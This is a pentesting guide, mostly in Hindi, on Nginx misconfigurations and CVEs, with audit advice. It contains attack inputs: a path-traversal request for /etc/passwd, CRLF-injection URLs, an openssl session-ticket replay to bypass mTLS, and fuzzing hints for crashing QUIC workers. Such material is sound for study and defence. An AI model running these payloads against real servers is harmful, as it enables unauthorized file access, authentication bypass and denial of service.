# Nginx

{{#include ../../banners/hacktricks-training.md}}


## Missing root location <a href="#missing-root-location" id="missing-root-location"></a>

Nginx सर्वर को कॉन्फ़िगर करते समय, **root directive** एक महत्वपूर्ण भूमिका निभाती है क्योंकि यह उस बेस डायरेक्टरी को परिभाषित करती है जिससे फाइलें सर्व की जाती हैं। नीचे दिए गए उदाहरण पर विचार करें:
```bash
server {
root /etc/nginx;

location /hello.txt {
try_files $uri $uri/ =404;
proxy_pass http://127.0.0.1:8080/;
}
}
```
इस configuration में, `/etc/nginx` को root directory के रूप में निर्दिष्ट किया गया है। यह सेटअप निर्दिष्ट root डायरेक्टरी के भीतर की फाइलों तक पहुँच की अनुमति देता है, जैसे `/hello.txt`। हालांकि, यह महत्वपूर्ण है कि केवल एक विशिष्ट location (`/hello.txt`) ही परिभाषित किया गया है। root location (`location / {...}`) के लिए कोई configuration मौजूद नहीं है। इस कमी का मतलब है कि root directive वैश्विक रूप से लागू होता है, जिससे root path `/` के अनुरोध `/etc/nginx` के अंतर्गत फाइलों तक पहुँचने में सक्षम होते हैं।

इस configuration से एक गंभीर सुरक्षा चिंता उत्पन्न होती है। एक साधारण `GET` अनुरोध, जैसे `GET /nginx.conf`, संवेदनशील जानकारी उजागर कर सकता है क्योंकि यह `/etc/nginx/nginx.conf` पर स्थित Nginx configuration फाइल सर्व कर सकता है। root को कम संवेदनशील डायरेक्टरी जैसे `/etc` पर सेट करने से इस जोखिम को कम किया जा सकता है, लेकिन यह फिर भी अन्य महत्वपूर्ण फाइलों तक अनिच्छित पहुँच की अनुमति दे सकता है — जैसे अन्य configuration फाइलें, access logs, और HTTP basic authentication के लिए उपयोग किए गए encrypted credentials भी।

## Alias LFI गलत कॉन्फ़िगरेशन <a href="#alias-lfi-misconfiguration" id="alias-lfi-misconfiguration"></a>

Nginx की configuration फ़ाइलों में "location" directives की बारीक जाँच जरूरी है। Local File Inclusion (LFI) के रूप में जानी जाने वाली एक vulnerability अनजाने में उस तरह के configuration के माध्यम से आ सकती है जो निम्नानुसार दिखती है:
```
location /imgs {
alias /path/images/;
}
```
यह कॉन्फ़िगरेशन LFI हमलों के प्रति संवेदनशील है क्योंकि सर्वर `/imgs../flag.txt` जैसे अनुरोधों को इच्छित निर्देशिका के बाहर फ़ाइलों तक पहुँचने का प्रयास समझता है, जो प्रभावी रूप से `/path/images/../flag.txt` में सुलझ जाता है। यह दोष हमलावरों को सर्वर की फ़ाइलसिस्टम से ऐसी फ़ाइलें प्राप्त करने की अनुमति देता है जो वेब के माध्यम से पहुँचने योग्य नहीं होनी चाहिए।

इस भेद्यता को कम करने के लिए, कॉन्फ़िगरेशन को निम्नानुसार समायोजित किया जाना चाहिए:
```
location /imgs/ {
alias /path/images/;
}
```
अधिक जानकारी: [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)

Accunetix परीक्षण:
```
alias../ => HTTP status code 403
alias.../ => HTTP status code 404
alias../../ => HTTP status code 403
alias../../../../../../../../../../../ => HTTP status code 400
alias../ => HTTP status code 403
```
## असुरक्षित पथ प्रतिबंध <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

निम्नलिखित पृष्ठ देखें यह जानने के लिए कि कैसे directives को bypass किया जाए:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
{{#ref}}
../../pentesting-web/proxy-waf-protections-bypass.md
{{#endref}}

## असुरक्षित वेरिएबल उपयोग / HTTP Request Splitting <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

> [!CAUTION]
> कमज़ोर वेरिएबल `$uri` और `$document_ur`i हैं और इसे `$request_uri` से बदलकर ठीक किया जा सकता है।
>
> एक regex भी कमजोर हो सकता है, जैसे:
>
> `location ~ /docs/([^/])? { … $1 … }` - कमजोर
>
> `location ~ /docs/([^/\s])? { … $1 … }` - कमजोर नहीं (स्पेस की जाँच)
>
> `location ~ /docs/(.*)? { … $1 … }` - कमजोर नहीं

Nginx कॉन्फ़िगरेशन में एक भेद्यता नीचे दिए उदाहरण से दर्शाई गई है:
```
location / {
return 302 https://example.com$uri;
}
```
\r (कैरिज रिटर्न) और \n (लाइन फीड) वर्ण HTTP अनुरोधों में नई लाइन संकेत करते हैं, और उनके URL-encoded रूप `%0d%0a` के रूप में दर्शाए जाते हैं।  
ऐसे वर्णों को एक अनुरोध में शामिल करने पर (उदाहरण के लिए, `http://localhost/%0d%0aDetectify:%20clrf`) एक गलत-संरचित सर्वर पर सर्वर एक नया हेडर `Detectify` जारी करता है।  
यह इसलिए होता है क्योंकि $uri वेरिएबल URL-encoded नई लाइन वर्णों को डीकोड कर देता है, जिसके परिणामस्वरूप प्रतिक्रिया में एक अनपेक्षित हेडर दिखाई देता है:
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```
CRLF injection और response splitting के जोखिमों के बारे में अधिक जानने के लिए देखें [https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/).

यह technique [**explained in this talk**](https://www.youtube.com/watch?v=gWQyWdZbdoY&list=PL0xCSYnG_iTtJe2V6PQqamBF73n7-f1Nr&index=77) में समझाई गई है, जिसमें कुछ vulnerable examples और detection mechanisms दिए गए हैं। उदाहरण के लिए, इस misconfiguration का blackbox परिप्रेक्ष्य से पता लगाने के लिए आप ये requests कर सकते हैं:

- `https://example.com/%20X` - कोई भी HTTP कोड
- `https://example.com/%20H` - 400 Bad Request

यदि vulnerable है, तो पहला रिटर्न करेगा क्योंकि "X" किसी भी HTTP method के रूप में माना जाएगा और दूसरा error देगा क्योंकि "H" एक मान्य method नहीं है। इसलिए server को कुछ इस तरह मिलेगा: `GET / H HTTP/1.1` और इससे error ट्रिगर होगा।

अन्य detection के उदाहरण हो सकते हैं:

- `http://company.tld/%20HTTP/1.1%0D%0AXXXX:%20x` - कोई भी HTTP कोड
- `http://company.tld/%20HTTP/1.1%0D%0AHost:%20x` - 400 Bad Request

उस टॉक में जो कुछ vulnerable configurations दिखाए गए थे, उनमें से कुछ:

- ध्यान दें कि **`$uri`** को अंतिम URL में वैसे ही सेट किया गया है।
```
location ^~ /lite/api/ {
proxy_pass http://lite-backend$uri$is_args$args;
}
```
- ध्यान दें कि फिर से **`$uri`** URL में है (इस बार एक parameter के अंदर)
```
location ~ ^/dna/payment {
rewrite ^/dna/([^/]+) /registered/main.pl?cmd=unifiedPayment&context=$1&native_uri=$uri break;
proxy_pass http://$back;
```
- अब AWS S3 में
```
location /s3/ {
proxy_pass https://company-bucket.s3.amazonaws.com$uri;
}
```
### कोई भी वेरिएबल

यह पाया गया कि **user-supplied data** कुछ परिस्थितियों में **Nginx variable** के रूप में व्यवहार किया जा सकता है। इस व्यवहार का कारण कुछ हद तक अस्पष्ट बना हुआ है, फिर भी यह दुर्लभ नहीं है और इसकी पुष्टि हमेशा सीधी नहीं होती। इस अनियमितता को HackerOne पर एक security report में उजागर किया गया था, जिसे आप [here](https://hackerone.com/reports/370094) पर देख सकते हैं। error message की आगे की जांच से यह पता चला कि यह घटना [SSI filter module of Nginx's codebase](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365) में होती है, और Server Side Includes (SSI) को मूल कारण के रूप में चिन्हित किया गया है।

To **detect this misconfiguration**, निम्नलिखित command चलाकर पता लगाया जा सकता है, जो variable printing की जांच के लिए referer header सेट करता है:
```bash
$ curl -H ‘Referer: bar’ http://localhost/foo$http_referer | grep ‘foobar’
```
Scans for this misconfiguration across systems revealed multiple instances where Nginx variables could be printed by a user. However, a decrease in the number of vulnerable instances suggests that efforts to patch this issue have been somewhat successful.

### try_files का उपयोग करके $URI$ARGS variables

निम्नलिखित Nginx misconfiguration LFI vulnerability का कारण बन सकती है:
```
location / {
try_files $uri$args $uri$args/ /index.html;
}
```
हमारी कॉन्फ़िगरेशन में `try_files` directive है जिसका उपयोग निर्दिष्ट क्रम में फ़ाइलों के मौजूद होने की जाँच करने के लिए किया जाता है। Nginx पहली मिलने वाली फ़ाइल को सर्व करेगा। `try_files` directive का मूल सिंटैक्स निम्नानुसार है:
```
try_files file1 file2 ... fileN fallback;
```
Nginx निर्दिष्ट क्रम में प्रत्येक फ़ाइल के अस्तित्व की जाँच करेगा। यदि कोई फ़ाइल मौजूद है, तो सर्वर उस फ़ाइल को तुरंत रिटर्न कर देगा। यदि निर्दिष्ट कोई भी फ़ाइल मौजूद नहीं है, तो अनुरोध fallback विकल्प को भेज दिया जाएगा, जो किसी अन्य URI या किसी विशिष्ट त्रुटि पृष्ठ हो सकता है।

हालाँकि, जब इस निर्देश में `$uri$args` वेरिएबल्स का उपयोग किया जाता है, तो Nginx उस फ़ाइल की तलाश करेगा जो request URI और किसी भी query string arguments के संयोजन से मेल खाती हो। इसलिए हम इस कॉन्फ़िगरेशन को exploit कर सकते हैं:
```
http {
server {
root /var/www/html/public;

location / {
try_files $uri$args $uri$args/ /index.html;
}
}
}
```
निम्नलिखित payload के साथ:
```
GET /?../../../../../../../../etc/passwd HTTP/1.1
Host: example.com
```
हमारे payload का उपयोग करके हम root directory (defined in Nginx configuration) से बाहर निकलकर `/etc/passwd` फ़ाइल लोड करेंगे। डिबग लॉग्स में हम देख सकते हैं कि Nginx फ़ाइलों को कैसे ट्राय करता है:
```
...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 trying to use file: "/../../../../../../../../etc/passwd" "/var/www/html/public/../../../../../../../../etc/passwd"
2025/07/11 15:49:16 [debug] 79694#79694: *4 try file uri: "/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 http filename: "/var/www/html/public/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 HTTP/1.1 200 OK

```
PoC Nginx के खिलाफ ऊपर बताए गए कॉन्फ़िगरेशन का उपयोग करके:
![Example burp request](../../images/nginx_try_files.png)

## कच्ची बैकएंड प्रतिक्रिया पढ़ना

Nginx `proxy_pass` के माध्यम से एक ऐसी सुविधा देता है जो बैकएंड द्वारा उत्पन्न त्रुटियों और HTTP headers को इंटरसेप्ट करने की अनुमति देती है, ताकि internal error messages और headers को छिपाया जा सके। यह Nginx द्वारा बैकएंड त्रुटियों के जवाब में कस्टम error pages सर्व करके किया जाता है। हालाँकि, समस्या तब पैदा होती है जब Nginx किसी अमान्य HTTP अनुरोध का सामना करता है। ऐसा अनुरोध प्राप्त रूप में बैकएंड को फॉरवर्ड कर दिया जाता है, और बैकएंड की कच्ची प्रतिक्रिया तब बिना Nginx के हस्तक्षेप के सीधे क्लाइंट को भेज दी जाती है।

एक उदाहरण परिदृश्य पर विचार करें जिसमें एक uWSGI एप्लिकेशन शामिल है:
```python
def application(environ, start_response):
start_response('500 Error', [('Content-Type', 'text/html'), ('Secret-Header', 'secret-info')])
return [b"Secret info, should not be visible!"]
```
इसे प्रबंधित करने के लिए, Nginx कॉन्फ़िगरेशन में विशिष्ट निर्देशों का उपयोग किया जाता है:
```
http {
error_page 500 /html/error.html;
proxy_intercept_errors on;
proxy_hide_header Secret-Header;
}
```
- [**proxy_intercept_errors**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_intercept_errors): यह निर्देश Nginx को बैकएंड प्रतिक्रियाओं के लिए कस्टम उत्तर परोसने में सक्षम बनाता है जिनकी स्टेटस कोड 300 से अधिक है। यह सुनिश्चित करता है कि हमारे उदाहरण uWSGI एप्लिकेशन के लिए, एक `500 Error` प्रतिक्रिया Nginx द्वारा इंटरसेप्ट और हैंडल की जाएगी।
- [**proxy_hide_header**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_hide_header): जैसा कि नाम से पता चलता है, यह निर्देश क्लाइंट से निर्दिष्ट HTTP हेडर छिपाता है, जिससे गोपनीयता और सुरक्षा बढ़ती है।

जब एक वैध `GET` अनुरोध किया जाता है, तो Nginx उसे सामान्य रूप से प्रोसेस करता है, एक मानक एरर प्रतिक्रिया लौटाता है बिना किसी secret headers को उजागर किए। हालांकि, एक अवैध HTTP अनुरोध इस मैकेनिज्म को बायपास कर देता है, जिससे raw backend responses उजागर हो सकते हैं, जिनमें secret headers और error messages शामिल हैं।

## merge_slashes set to off

By default, Nginx's **`merge_slashes` directive** is set to **`on`**, which compresses multiple forward slashes in a URL into a single slash. This feature, while streamlining URL processing, can inadvertently conceal vulnerabilities in applications behind Nginx, particularly those prone to local file inclusion (LFI) attacks. Security experts **Danny Robinson and Rotem Bar** have highlighted the potential risks associated with this default behavior, especially when Nginx acts as a reverse-proxy.

To mitigate such risks, it is recommended to **turn the `merge_slashes` directive off** for applications susceptible to these vulnerabilities. This ensures that Nginx forwards requests to the application without altering the URL structure, thereby not masking any underlying security issues.

For more information check [Danny Robinson and Rotem Bar](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d).

### **Maclicious प्रतिक्रिया हेडर**

As shown in [**this writeup**](https://mizu.re/post/cors-playground), there are certain headers that if present in the response from the web server they will change the behaviour of the Nginx proxy. You can check them [**in the docs**](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/):

- `X-Accel-Redirect`: Nginx को एक निर्दिष्ट स्थान पर internal redirect करने का संकेत देता है।
- `X-Accel-Buffering`: नियंत्रित करता है कि Nginx को response को buffer करना चाहिए या नहीं।
- `X-Accel-Charset`: जब X-Accel-Redirect का उपयोग किया जा रहा हो तब response के लिए character set सेट करता है।
- `X-Accel-Expires`: जब X-Accel-Redirect का उपयोग किया जा रहा हो तब response के लिए expiration time सेट करता है।
- `X-Accel-Limit-Rate`: जब X-Accel-Redirect का उपयोग किया जा रहा हो तब responses के लिए transfer rate को सीमित करता है।

For example, the header **`X-Accel-Redirect`** will cause an internal **redirect** in the nginx. So having an nginx configuration with something such as **`root /`** and a response from the web server with **`X-Accel-Redirect: .env`** will make nginx sends the content of **`/.env`** (Path Traversal).

### **Map Directive में डिफ़ॉल्ट मान**

In the **Nginx configuration**, the `map` directive often plays a role in **authorization control**. A common mistake is not specifying a **default** value, which could lead to unauthorized access. For instance:
```yaml
http {
map $uri $mappocallow {
/map-poc/private 0;
/map-poc/secret 0;
/map-poc/public 1;
}
}
```

```yaml
server {
location /map-poc {
if ($mappocallow = 0) {return 403;}
return 200 "Hello. It is private area: $mappocallow";
}
}
```
यदि `default` मौजूद नहीं है, तो एक **malicious user** `/map-poc` के भीतर किसी **undefined URI** तक पहुँच कर सुरक्षा को बायपास कर सकता है। [The Nginx manual](https://nginx.org/en/docs/http/ngx_http_map_module.html) सलाह देती है कि ऐसे मामलों से बचने के लिए एक **default value** सेट किया जाना चाहिए।

### **DNS Spoofing Vulnerability**

कुछ शर्तों में Nginx के खिलाफ DNS spoofing संभव है। यदि कोई attacker Nginx द्वारा उपयोग किए जा रहे **DNS server** को जानता है और उसके DNS queries को intercept कर सकता है, तो वे DNS records को spoof कर सकते हैं। हालाँकि, यह तरीका तब कारगर नहीं है जब Nginx DNS resolution के लिए **localhost (127.0.0.1)** का उपयोग करने के लिए configured है। Nginx आपको निम्नानुसार एक DNS server निर्दिष्ट करने की अनुमति देता है:
```yaml
resolver 8.8.8.8;
```
### **`proxy_pass` और `internal` निर्देश**

**`proxy_pass`** निर्देश का उपयोग अनुरोधों को अन्य सर्वरों पर (आंतरिक या बाह्य) रीडायरेक्ट करने के लिए किया जाता है। **`internal`** निर्देश सुनिश्चित करता है कि कुछ लोकेशन केवल Nginx के भीतर ही पहुँच योग्य हों। हालाँकि ये निर्देश स्वयं में vulnerabilities नहीं हैं, उनकी कॉन्फ़िगरेशन को सुरक्षा चूकों से बचाने के लिए सावधानीपूर्वक जाँचना आवश्यक है।

## proxy_set_header Upgrade & Connection

यदि nginx सर्वर को Upgrade और Connection हेडर्स पास करने के लिए कॉन्फ़िगर किया गया है, तो [**h2c Smuggling attack**](../../pentesting-web/h2c-smuggling.md) किया जा सकता है ताकि protected/internal endpoints तक पहुँच बनाई जा सके।

> [!CAUTION]
> यह vulnerability एक attacker को **`proxy_pass` endpoint` के साथ एक प्रत्यक्ष कनेक्शन स्थापित करने की अनुमति देगा** (`http://backend:9999` इस मामले में) जिसका कंटेंट nginx द्वारा जाँच नहीं किया जाएगा।

Example of vulnerable configuration to steal `/flag` from [here](https://bishopfox.com/blog/h2c-smuggling-request):
```
server {
listen       443 ssl;
server_name  localhost;

ssl_certificate       /usr/local/nginx/conf/cert.pem;
ssl_certificate_key   /usr/local/nginx/conf/privkey.pem;

location / {
proxy_pass http://backend:9999;
proxy_http_version 1.1;
proxy_set_header Upgrade $http_upgrade;
proxy_set_header Connection $http_connection;
}

location /flag {
deny all;
}
```
> [!WARNING]
> ध्यान दें कि भले ही `proxy_pass` किसी विशेष **path** की ओर इशारा कर रहा हो, जैसे `http://backend:9999/socket.io`, कनेक्शन `http://backend:9999` के साथ स्थापित होगा इसलिए आप उस internal endpoint के भीतर किसी भी अन्य path से **contact** कर सकते हैं। **इसलिए proxy_pass की URL में path निर्दिष्ट होना मायने नहीं रखता।**

## HTTP/3 QUIC module remote DoS & leak (2024)

During 2024 Nginx disclosed CVE-2024-31079, CVE-2024-32760, CVE-2024-34161 and CVE-2024-35200 showing that a **single hostile QUIC session** can crash worker processes or leak memory whenever the experimental `ngx_http_v3_module` is compiled in and a `listen ... quic` socket is exposed. Impacted builds are 1.25.0–1.25.5 and 1.26.0, while 1.27.0/1.26.1 ship the fixes; the memory disclosure (CVE-2024-34161) additionally requires MTUs larger than 4096 bytes to surface sensitive data (details in the 2024 nginx advisory referenced below).

**Recon & exploitation hints**

- HTTP/3 opt-in है, इसलिए `Alt-Svc: h3=":443"` responses के लिए scan करें या UDP/443 पर QUIC handshakes को brute-force करें; एक बार पुष्टि हो जाने पर, worker crashes को trigger करने और log leakage को force करने के लिए handshake और STREAM frames को custom `quiche-client`/`nghttp3` payloads के साथ fuzz करें।
- Quickly fingerprint target support with:
```bash
nginx -V 2>&1 | grep -i http_v3
rg -n "listen .*quic" /etc/nginx/
```
## TLS session resumption द्वारा client cert auth को बायपास (CVE-2025-23419)

February 2025 की advisory में बताया गया कि OpenSSL के साथ build किए गए nginx 1.11.4–1.27.3 में एक name-based virtual host से **TLS 1.3 session का पुन: उपयोग** दूसरे host के अंदर किया जा सकता है, इसलिए जो client एक certificate-free host के साथ negotiate कर चुका है वह ticket/PSK को replay करके `ssl_verify_client on;` से protected vhost में jump कर सकता है और mTLS को पूरी तरह skip कर सकता है। यह बग तब trigger होता है जब multiple virtual hosts एक ही TLS 1.3 session cache और tickets शेयर करते हैं (नीचे संदर्भित 2025 nginx advisory देखें).

**Attacker playbook**
```bash
# 1. Create a TLS session on the public vhost and save the session ticket
openssl s_client -connect public.example.com:443 -sess_out ticket.pem

# 2. Replay that session ticket against the mTLS vhost before it expires
openssl s_client -connect admin.example.com:443 -sess_in ticket.pem -ign_eof
```
यदि लक्ष्य संवेदनशील है, तो दूसरा हैंडशेक बिना किसी क्लाइंट सर्टिफिकेट को प्रस्तुत किए पूरा हो जाता है, जिससे सुरक्षित स्थान उजागर हो सकते हैं।

**क्या ऑडिट करें**

- मिश्रित `server_name` ब्लॉक्स जो `ssl_session_cache shared:SSL` और `ssl_session_tickets on;` साझा करते हैं।
- Admin/API ब्लॉक्स जो mTLS की उम्मीद करते हैं पर सार्वजनिक hosts से साझा session cache/ticket सेटिंग्स inherit कर लेते हैं।
- ऐसा automation जो vhost अलगाव पर विचार किए बिना वैश्विक रूप से TLS 1.3 session resumption सक्षम कर देता है (उदा., Ansible roles)।

## HTTP/2 Rapid Reset प्रतिरोधक क्षमता (CVE-2023-44487 व्यवहार)

The HTTP/2 Rapid Reset attack (CVE-2023-44487) अभी भी nginx को प्रभावित करती है जब ऑपरेटर `keepalive_requests` या `http2_max_concurrent_streams` को डिफ़ॉल्ट्स से ऊपर बढ़ा देते हैं: एक attacker एक HTTP/2 connection खोलता है, उसे हजारों streams से भर देता है, और फिर तुरंत `RST_STREAM` frames जारी कर देता है ताकि concurrency ceiling कभी नहीं पहुँचे जबकि CPU tear-down logic पर लगातार व्यस्त रहे। Nginx के डिफ़ॉल्ट्स (128 concurrent streams, 1000 keepalive requests) प्रभाव क्षेत्र छोटा रखते हैं; उन सीमाओं को "काफी अधिक" कर देने से even एक single client से भी workers को संसाधन-हीन करना trivial हो जाता है (नीचे संदर्भित F5 write-up देखें)।

**पता लगाने के सुझाव**
```bash
# Highlight risky knobs
rg -n "http2_max_concurrent_streams" /etc/nginx/
rg -n "keepalive_requests" /etc/nginx/
```
Hosts that reveal unusually high values for those directives are prime targets: one HTTP/2 client can loop through stream creation and instant `RST_STREAM` frames to keep CPU pegged without tripping the concurrency cap.

## खुद आज़माएँ

Detectify ने एक GitHub repository बनाया है जहाँ आप Docker का उपयोग करके अपने स्वयं के vulnerable Nginx test server को सेटअप कर सकते हैं, जिनमें इस लेख में चर्चा की गई कुछ misconfigurations शामिल हैं, और उन्हें स्वयं खोजने की कोशिश कर सकते हैं!

[https://github.com/detectify/vulnerable-nginx](https://github.com/detectify/vulnerable-nginx)

## स्टैटिक एनालाइज़र टूल्स

### [GIXY](https://github.com/yandex/gixy)

Gixy एक टूल है जो Nginx configuration का विश्लेषण करता है। Gixy का मुख्य उद्देश्य security misconfiguration को रोकना और flaw detection को स्वचालित करना है।

### [Nginxpwner](https://github.com/stark0de/nginxpwner)

Nginxpwner एक सरल टूल है जो सामान्य Nginx misconfigurations और vulnerabilities की तलाश करता है।

## संदर्भ

- [**https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/**](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)
- [**http://blog.zorinaq.com/nginx-resolver-vulns/**](http://blog.zorinaq.com/nginx-resolver-vulns/)
- [**https://github.com/yandex/gixy/issues/115**](https://github.com/yandex/gixy/issues/115)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html**](https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html**](https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html)
- [**https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products**](https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products)


{{#include ../../banners/hacktricks-training.md}}
